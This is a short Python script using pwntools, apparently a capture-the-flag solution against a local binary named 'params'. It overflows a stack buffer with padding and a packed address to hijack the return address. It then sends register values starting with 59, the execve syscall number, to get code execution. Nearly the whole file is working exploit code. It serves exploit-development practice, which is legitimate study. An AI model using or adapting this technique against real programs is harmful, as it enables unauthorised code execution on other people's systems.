#!/bin/python
from pwn import *
target = process("./params")

print(target.recvline()) # hey bb
print(target.recvline()) # whats ur name

target.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x13\x40\x00") # jump to 0x0000000000401354
print("overwrote return adress")

print(target.recvline()) # hello $NAME
print(target.recvline()) # you can set my registers any day of the week

#target.recvuntil(":")
target.sendline(b"59") # exec syscall
target.sendline(b"0")
target.sendline(b"0")
target.sendline(b"0")
target.sendline(b"0")
target.sendline(b"0")






